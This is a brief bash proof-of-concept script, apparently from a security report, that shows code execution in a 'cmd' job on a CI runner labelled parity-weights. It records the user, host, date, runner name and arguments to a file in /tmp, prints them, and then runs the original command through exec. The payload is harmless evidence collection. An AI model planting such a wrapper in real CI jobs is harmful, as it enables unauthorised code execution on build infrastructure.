#!/bin/bash
# PoC capability proof: runs in the container of the cmd job ON THE parity-weights-LABELED RUNNER
{ echo "POC-RCE-CMD-BYPASS"; echo "whoami=$(whoami)"; echo "hostname=$(hostname)"; echo "date=$(date -u)"; echo "runner_env=${RUNNER_NAME:-n/a}"; echo "cmd=${CMD:-n/a}"; echo "args=$*"; } > /tmp/poc-evidence.txt 2>&1 || true
cat /tmp/poc-evidence.txt 2>/dev/null || { echo "POC EXECUTED on $(hostname) as $(whoami) at $(date -u)"; }
exec "$@"
